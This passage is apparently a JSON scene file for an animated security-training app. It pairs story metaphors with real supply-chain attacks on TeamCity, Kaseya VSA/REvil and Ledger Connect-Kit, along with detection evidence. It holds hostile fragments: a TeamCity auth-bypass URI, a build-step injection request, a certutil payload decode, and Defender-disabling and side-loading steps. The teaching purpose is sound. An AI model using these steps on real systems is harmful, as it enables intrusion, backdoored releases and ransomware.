          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Back-office token desk",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across back-office token desk while locking down fresh master admin keycard minted on demand.",
          "technicalParallel": "Documented in SIEM Event 200 (recording VulnerabilityId=CVE-2024-27198 , CVSS 9.8 Critical Auth Bypass, BypassUriPattern=/hax?jsp=/app/rest/users/id:1/tokens/RPC2;.jsp, MintedArtifact=Admin Bearer Token…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Press",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Card",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning",
      "sectionKey": "step-2",
      "sceneKind": "sup-teamcity-27198-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "CI/CD Build Step Injection (/app/rest/buildTypes) & Signing Key Access",
      "storyCue": "Walking onto the factory floor with the newly minted admin keycard, the intruder opens the master assembly-line schedule, locates the flagship customer release belt, and inserts a covert extra build step right before the official code-signing press.",
      "technicalCue": "T1195.002 · EXECUTION — Authenticating with the newly minted Authorization: Bearer eyJ0eXAi... token, the attacker queries /app/rest/buildTypes to locate the organization’s production software release pipeline and…",
      "storyMappings": [
        {
          "storyTerm": "Master assembly-line schedule",
          "technicalTerm": "TeamCity /app/rest/buildTypes API listing production build configurations",
          "tone": "amber"
        },
        {
          "storyTerm": "Flagship customer release belt",
          "technicalTerm": "ProdRelease CI/CD pipeline holding code-signing certificates and secrets",
          "tone": "sky"
        },
        {
          "storyTerm": "Covert extra build step inserted before signing",
          "technicalTerm": "Injected malicious compilation or patch runner step via TeamCity REST API",
          "tone": "rose"
        },
        {
          "storyTerm": "Newly minted admin keycard",
          "technicalTerm": "Hijacked administrator Bearer token authenticating pipeline modifications",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-teamcity-27198-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Master assembly-line schedule",
          "subtitle": "TeamCity /app/rest/buildTypes API listing production build…",
          "tone": "amber"
        },
        {
          "id": "sup-teamcity-27198-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Flagship customer release belt",
          "subtitle": "ProdRelease CI/CD pipeline holding code-signing certificates…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Onto Belt",
          "stageTag": "STEP 02 · SETUP",
          "title": "Master assembly-line schedule",
          "storyExcerpt": "Walking onto the factory floor with the newly minted admin keycard, the intruder opens the master assembly-line schedule, locates the flagship customer release belt, and inserts a covert extra…",
          "technicalParallel": "Under the hood, the observed step executes POST /app/rest/buildTypes/id:ProdRelease/steps HTTP/1.1 (Injects pre-signing command.executable build step) (which Transmits a crafted HTTP request , POST…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Belt",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Flagship customer release belt",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses flagship customer release belt to advance toward covert extra build step inserted before signing.",
          "technicalParallel": "Authenticating with the newly minted Authorization: Bearer eyJ0eXAi... token, the attacker queries /app/rest/buildTypes to locate the organization’s production software release pipeline and injects a…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Onto Belt",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Newly minted admin keycard",
          "storyExcerpt": "Behind the scenes, newly minted admin keycard captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in SIEM Event 200 (recording ModifiedPipeline=id:ProdRelease , /app/rest/buildTypes/id:ProdRelease/steps, AuditLogFile=logs/teamcity-activities.log, MitreId=T1195.002 , Compromise Software…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Press",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Card",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-3": {
      "scenarioId": "jetbrains-teamcity-cve-2024-27198-supply-chain-build-poisoning",
      "sectionKey": "step-3",
      "sceneKind": "sup-teamcity-27198-step-3",
      "stageBadge": "STEP #3 · INITIAL ACCESS",
      "title": "Trojanized Build Compilation, Official Code Signing & Downstream Distribution",
      "storyCue": "On the next scheduled shipment, the unsuspecting factory robot follows the altered conveyor instructions, welds a hidden backdoor inside the finished product, stamps the company authentic cryptographic warranty seal onto the crate, and ships it straight out to trusting customers.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — When the TeamCity build agent executes ProdRelease, the injected step compiles a backdoor into the release binary, which then passes into the legitimate HSM/Authenticode signing step and is…",
      "storyMappings": [
        {
          "storyTerm": "Unsuspecting factory robot running the schedule",
          "technicalTerm": "TeamCity build agent executing the tampered ProdRelease pipeline",
          "tone": "amber"
        },
        {
          "storyTerm": "Welding a hidden backdoor inside the finished product",
          "technicalTerm": "Malicious build step compiling backdoor code into the official release binary",
          "tone": "sky"
        },
        {
          "storyTerm": "Authentic cryptographic warranty seal",
          "technicalTerm": "Legitimate vendor code-signing key applied automatically by the release stage",
          "tone": "rose"
        },
        {
          "storyTerm": "Shipping trojanized crates to trusting customers",
          "technicalTerm": "Downstream supply-chain distribution of officially signed backdoored installers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-teamcity-27198-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Unsuspecting factory robot running the…",
          "subtitle": "TeamCity build agent executing the tampered ProdRelease pipeline",
          "tone": "amber"
        },
        {
          "id": "sup-teamcity-27198-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Welding a hidden backdoor inside the…",
          "subtitle": "Malicious build step compiling backdoor code into the official…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Next",
          "stageTag": "STEP 03 · SETUP",
          "title": "Unsuspecting factory robot running the schedule",
          "storyExcerpt": "On the next scheduled shipment, the unsuspecting factory robot follows the altered conveyor instructions, welds a hidden backdoor inside the finished product, stamps the company authentic…",
          "technicalParallel": "Under the hood, the observed step executes TeamCity Build Agent executes injected step -> Compiles backdoored binary -> signtool.exe sign /tr http://timestamp.digicert.com ReleaseApp.exe (which executes…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Seal",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Welding a hidden backdoor inside the finished product",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses welding a hidden backdoor inside the finished product to advance toward authentic cryptographic warranty seal.",
          "technicalParallel": "When the TeamCity build agent executes ProdRelease, the injected step compiles a backdoor into the release binary, which then passes into the legitimate HSM/Authenticode signing step and is published to…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Seal",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Shipping trojanized crates to trusting customers",
          "storyExcerpt": "Behind the scenes, shipping trojanized crates to trusting customers captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording SupplyChainImpact=Trojanized release binary signed with legitimate enterprise certificate, BuildAgentParent=C:\\BuildAgent\\jre\\bin\\java.exe under T1195.002)…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Press",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Card",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    }
  },
  "kaseya-vsa-revil-cve-2021-30116": {
    "briefing": {
      "scenarioId": "kaseya-vsa-revil-cve-2021-30116",
      "sectionKey": "briefing",
      "sceneKind": "sup-kaseya-vsa-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Kaseya VSA MSP Zero-Day & REvil MsMpEng.exe Side-Loading (CVE-2021-30116) — Story-to-Technical Overview",
      "storyCue": "Imagine a master building-management dispatch console that manages heating and maintenance crews for hundreds of client office towers at once. Attackers break past the dispatch console front lock, broadcast a fake urgent maintenance order to every connected client tower telling local staff to unplug the fire alarms and unpack a disguised toolbox, and then slip a poisoned spare part into an authentic security-guard tool so every client tower locks its own doors for ransom simultaneously.",
      "technicalCue": "INITIAL ACCESS: Kaseya VSA /dl.asp Authentication Bypass & agent.crt Upload -> DEFENSE EVASION: Kaseya Agent Procedure Disabling Defender & Decoding agent.exe -> DEFENSE EVASION: MsMpEng.exe DLL Side-Loading of REvil Ransomware (mpsvc.dll)",
      "storyMappings": [
        {
          "storyTerm": "Master building-management dispatch console",
          "technicalTerm": "Internet-exposed Kaseya VSA Managed Service Provider (MSP) server",
          "tone": "amber"
        },
        {
          "storyTerm": "Breaking past the dispatch front lock",
          "technicalTerm": "CVE-2021-30116 authentication bypass on /dl.asp uploading agent.crt",
          "tone": "sky"
        },
        {
          "storyTerm": "Fake urgent maintenance order unplugging fire alarms",
          "technicalTerm": "Pushed \"Kaseya VSA Agent Hot-fix\" disabling Windows Defender and decoding agent.exe",
          "tone": "rose"
        },
        {
          "storyTerm": "Slipping a poisoned part into an authentic guard tool",
          "technicalTerm": "Older signed MsMpEng.exe DLL side-loading REvil ransomware (mpsvc.dll)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#FACC15",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-kaseya-vsa-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Master building-management dispatch…",
          "subtitle": "Internet-exposed Kaseya VSA Managed Service Provider (MSP)…",
          "tone": "amber"
        },
        {
          "id": "sup-kaseya-vsa-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Breaking past the dispatch front lock",
          "subtitle": "CVE-2021-30116 authentication bypass on /dl.asp uploading…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Past",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Kaseya VSA /dl.asp Authentication Bypass & agent.crt Upload",
          "storyExcerpt": "Approaching the central dispatch console before a holiday weekend, the intruder slips past the front badge reader using an unpatched backdoor window and uploads a disguised maintenance parcel labeled as…",
          "technicalParallel": "The attacker also modified /userFilterTableRpt.asp in memory/disk to execute SQL commands and stage the malicious Kaseya Agent Procedure across all tenant organizations managed by the VSA server.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Past Lock",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Kaseya Agent Procedure Disabling Defender & Decoding agent.exe",
          "storyExcerpt": "Using the trusted dispatch megaphone, the intruder broadcasts a bogus emergency patch order to every managed office tower at once. Obeying their trusted supervisor automatically, local building agents…",
          "technicalParallel": "Before running the command, the batch line used ping 127.0.0.1 -n 4979 > nul as a timed delay so all downstream endpoints downloaded agent.crt before simultaneous execution began, preventing the VSA…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Fake Fire",
          "stageTag": "STAGE 03 · DEFENSE EVASION",
          "title": "MsMpEng.exe DLL Side-Loading of REvil Ransomware (mpsvc.dll)",
          "storyExcerpt": "The unpacked toolkit places two paired items side by side on the main hall table: first, an older genuinely stamped security-guard badge machine so hallway monitors trust the launch, and second, a…",
          "technicalParallel": "Because MsMpEng.exe carries a valid Microsoft digital signature, naive process-allowlisting rules treated the executing process as benign while mpsvc.dll ran REvil’s multi-threaded encryption routine…",
          "accentHex": "#FACC15",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Hub",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Client Fleet",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Mass Update",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "kaseya-vsa-revil-cve-2021-30116",
      "sectionKey": "step-1",
      "sceneKind": "sup-kaseya-vsa-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Kaseya VSA /dl.asp Authentication Bypass & agent.crt Upload",
      "storyCue": "Approaching the central dispatch console before a holiday weekend, the intruder slips past the front badge reader using an unpatched backdoor window and uploads a disguised maintenance parcel labeled as an official security certificate.",
      "technicalCue": "T1190 · INITIAL ACCESS — The threat actor sent crafted HTTP POST requests to /dl.asp on internet-exposed Kaseya VSA servers, exploiting CVE-2021-30116 (a credential leak and authentication bypass in session validation…",
      "storyMappings": [
        {
          "storyTerm": "Unpatched backdoor window on the dispatch console",
          "technicalTerm": "Unauthenticated HTTP POST to /dl.asp exploiting CVE-2021-30116",
          "tone": "amber"
        },
        {
          "storyTerm": "Disguised parcel labeled as an official certificate",
          "technicalTerm": "Base64-encoded payload staged as c:\\kworking\\agent.crt",
          "tone": "sky"
        },
        {
          "storyTerm": "Central dispatch console",
          "technicalTerm": "Compromised Kaseya VSA management server controlling downstream MSP agents",
          "tone": "rose"
        },
        {
          "storyTerm": "Holiday weekend timing",
          "technicalTerm": "Coordinated Friday afternoon launch minimizing immediate SOC response",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-kaseya-vsa-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Unpatched backdoor window on the…",
          "subtitle": "Unauthenticated HTTP POST to /dl.asp exploiting CVE-2021-30116",
          "tone": "amber"
        },
        {
          "id": "sup-kaseya-vsa-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Disguised parcel labeled as an official…",
          "subtitle": "Base64-encoded payload staged as c:\\kworking\\agent.crt",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Past",
          "stageTag": "STEP 01 · SETUP",
          "title": "Unpatched backdoor window on the dispatch console",
          "storyExcerpt": "Approaching the central dispatch console before a holiday weekend, the intruder slips past the front badge reader using an unpatched backdoor window and uploads a disguised maintenance parcel…",
          "technicalParallel": "The attacker also modified /userFilterTableRpt.asp in memory/disk to execute SQL commands and stage the malicious Kaseya Agent Procedure across all tenant organizations managed by the VSA server.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Disguised parcel labeled as an official certificate",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses disguised parcel labeled as an official certificate to advance toward central dispatch console.",
          "technicalParallel": "The threat actor sent crafted HTTP POST requests to /dl.asp on internet-exposed Kaseya VSA servers, exploiting CVE-2021-30116 (a credential leak and authentication bypass in session validation logic…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Past",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Holiday weekend timing",
          "storyExcerpt": "Behind the scenes, holiday weekend timing captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "IIS web server logs showing POST requests to /dl.asp and /userFilterTableRpt.asp with User-Agent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; SV1; SE) and creation of agent.crt.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Hub",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Client Fleet",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Mass Update",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "kaseya-vsa-revil-cve-2021-30116",
      "sectionKey": "step-2",
      "sceneKind": "sup-kaseya-vsa-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Kaseya Agent Procedure Disabling Defender & Decoding agent.exe",
      "storyCue": "Using the trusted dispatch megaphone, the intruder broadcasts a bogus emergency patch order to every managed office tower at once. Obeying their trusted supervisor automatically, local building agents switch off every smoke detector and unpack the disguised certificate parcel into a live toolkit.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — The compromised VSA server pushed an automated script titled \"Kaseya VSA Agent Hot-fix\" to all managed endpoints.",
      "storyMappings": [
        {
          "storyTerm": "Trusted dispatch megaphone broadcasting an emergency order",
          "technicalTerm": "Kaseya VSA Agent Procedure pushed as \"Kaseya VSA Agent Hot-fix\"",
          "tone": "amber"
        },
        {
          "storyTerm": "Local building agents obeying automatically",
          "technicalTerm": "Trusted AgentMon.exe executing PowerShell commands as NT AUTHORITY\\SYSTEM",
          "tone": "sky"
        },
        {
          "storyTerm": "Switching off every smoke detector",
          "technicalTerm": "PowerShell Set-MpPreference disabling Windows Defender real-time monitoring",
          "tone": "rose"
        },
        {
          "storyTerm": "Unpacking the certificate parcel into a live toolkit",
          "technicalTerm": "certutil.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-kaseya-vsa-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Trusted dispatch megaphone broadcasting…",
          "subtitle": "Kaseya VSA Agent Procedure pushed as \"Kaseya VSA Agent Hot-fix\"",
          "tone": "amber"
        },
        {
          "id": "sup-kaseya-vsa-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Local building agents obeying…",
          "subtitle": "Trusted AgentMon.exe executing PowerShell commands as NT…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Off Live",
          "stageTag": "STEP 02 · SETUP",
          "title": "Trusted dispatch megaphone broadcasting an emergency…",
          "storyExcerpt": "Using the trusted dispatch megaphone, the intruder broadcasts a bogus emergency patch order to every managed office tower at once.",
          "technicalParallel": "Before running the command, the batch line used ping 127.0.0.1 -n 4979 > nul as a timed delay so all downstream endpoints downloaded agent.crt before simultaneous execution began, preventing the VSA…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Off Live",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Local building agents obeying automatically",
          "storyExcerpt": "Obeying their trusted supervisor automatically, local building agents switch off every smoke detector and unpack the disguised certificate parcel into a live toolkit.",
          "technicalParallel": "The compromised VSA server pushed an automated script titled \"Kaseya VSA Agent Hot-fix\" to all managed endpoints.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Live",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Unpacking the certificate parcel into a live toolkit",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across unpacking the certificate parcel into a live toolkit while locking down switching off every smoke detector.",
          "technicalParallel": "Alert on Sysmon EventID 1 (Process Creation capturing parent-child lineage and command-line arguments) showing AgentMon.exe spawning cmd.exe or powershell.exe invoking Set-MpPreference alongside…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Hub",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Client Fleet",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Mass Update",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "step-3": {
      "scenarioId": "kaseya-vsa-revil-cve-2021-30116",
      "sectionKey": "step-3",
      "sceneKind": "sup-kaseya-vsa-step-3",
      "stageBadge": "STEP #3 · DEFENSE EVASION",
      "title": "MsMpEng.exe DLL Side-Loading of REvil Ransomware (mpsvc.dll)",
      "storyCue": "The unpacked toolkit places two paired items side by side on the main hall table: first, an older genuinely stamped security-guard badge machine so hallway monitors trust the launch, and second, a counterfeit internal gear bearing the exact spare-part name that the guard machine automatically loads, triggering simultaneous ransomware lockouts across every managed customer.",
      "technicalCue": "T1574.002 · DEFENSE EVASION — When c:\\kworking\\agent.exe ran, it dropped two files directly into C:\\Windows\\: a legitimate, older Microsoft-signed Windows Defender executable (MsMpEng.exe) and a malicious DLL named…",
      "storyMappings": [
        {
          "storyTerm": "Older genuinely stamped security-guard badge machine",
          "technicalTerm": "Legitimate older Microsoft-signed Windows Defender binary (MsMpEng.exe) dropped to C:\\Windows\\",
          "tone": "amber"
        },
        {
          "storyTerm": "Counterfeit internal gear bearing the expected spare-part name",
          "technicalTerm": "Malicious REvil ransomware payload named mpsvc.dll placed beside MsMpEng.exe",
          "tone": "sky"
        },
        {
          "storyTerm": "Guard machine automatically loading the adjacent gear",
          "technicalTerm": "DLL search-order side-loading executing mpsvc.dll inside a signed Microsoft process",
          "tone": "rose"
        },
        {
          "storyTerm": "Simultaneous lockouts across every customer tower",
          "technicalTerm": "Mass REvil file encryption across MSP-managed downstream enterprises",
          "tone": "emerald"
        }
      ],
      "accentHex": "#FACC15",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-kaseya-vsa-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Older genuinely stamped security-guard…",
          "subtitle": "Legitimate older Microsoft-signed Windows Defender binary…",
          "tone": "amber"
        },
        {
          "id": "sup-kaseya-vsa-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Counterfeit internal gear bearing the…",
          "subtitle": "Malicious REvil ransomware payload named mpsvc.dll placed…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Two Side",
          "stageTag": "STEP 03 · SETUP",
          "title": "Older genuinely stamped security-guard badge machine",
          "storyExcerpt": "The unpacked toolkit places two paired items side by side on the main hall table: first, an older genuinely stamped security-guard badge machine so hallway monitors trust the launch, and…",
          "technicalParallel": "Because MsMpEng.exe carries a valid Microsoft digital signature, naive process-allowlisting rules treated the executing process as benign while mpsvc.dll ran REvil’s multi-threaded encryption routine…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Gear Name",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Counterfeit internal gear bearing the expected…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses counterfeit internal gear bearing the expected spare-part name to advance toward guard machine automatically loading the adjacent gear.",
          "technicalParallel": "When c:\\kworking\\agent.exe ran, it dropped two files directly into C:\\Windows\\: a legitimate, older Microsoft-signed Windows Defender executable (MsMpEng.exe) and a malicious DLL named mpsvc.dll…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Gear",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Simultaneous lockouts across every customer tower",
          "storyExcerpt": "Behind the scenes, simultaneous lockouts across every customer tower captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Sysmon EventID 7 (ImageLoaded) showing C:\\Windows\\MsMpEng.exe (executing outside ProgramData\\Microsoft\\Windows Defender) loading C:\\Windows\\mpsvc.dll.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Hub",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Client Fleet",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Mass Update",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1574.002"
    }
  },
  "ledger-connect-kit-npmjs-drainer": {
    "briefing": {
      "scenarioId": "ledger-connect-kit-npmjs-drainer",
      "sectionKey": "briefing",
      "sceneKind": "sup-ledger-kit-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.001",
      "title": "Ledger Connect-Kit NPM Compromise & Web3 WalletConnect Drainer — Story-to-Technical Overview",
      "storyCue": "Imagine a trusted hardware vault manufacturer that forgets to cancel a former employee warehouse keycard after they leave the company. A thief tricks the former employee out of that still-active keycard, pushes a poisoned connector module onto the public parts rack, and because hundreds of decentralized banks auto-load the latest version straight from a shared courier truck without pinning a version seal, every customer opening their vault is shown a counterfeit signing screen that empties their holdings.",
      "technicalCue": "INITIAL ACCESS: Former Employee NPM Token Phishing & Publish of v1.1.5–1.1.7 -> EXECUTION: Unpinned jsDelivr CDN Propagation of @ledgerhq/connect-kit-loader -> EXFIL & IMPACT: Rogue WalletConnect Modal & Permit2 / SetApprovalForAll Asset Drain",
      "storyMappings": [
        {
          "storyTerm": "Former employee keycard never canceled after offboarding",
          "technicalTerm": "Phished npmjs account retaining publish rights to @ledgerhq/connect-kit",
          "tone": "amber"
        },
        {
          "storyTerm": "Shared courier truck delivering unpinned updates to hundreds of banks",
          "technicalTerm": "@ledgerhq/connect-kit-loader fetching unpinned jsDelivr @ledgerhq/connect-kit@1",
          "tone": "sky"
        },
        {
          "storyTerm": "Counterfeit vault signing screen",
          "technicalTerm": "Angel Drainer rogue WalletConnect modal using an attacker Project ID",
          "tone": "rose"
        },
        {
          "storyTerm": "Tricking customers into signing away their holdings",
          "technicalTerm": "Malicious eth_signTypedData_v4 (Permit2) and setApprovalForAll drain transactions",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-ledger-kit-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Former employee keycard never canceled…",
          "subtitle": "Phished npmjs account retaining publish rights to…",
          "tone": "amber"
        },
        {
          "id": "sup-ledger-kit-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Shared courier truck delivering unpinned…",
          "subtitle": "@ledgerhq/connect-kit-loader fetching unpinned jsDelivr…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lure Onto",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
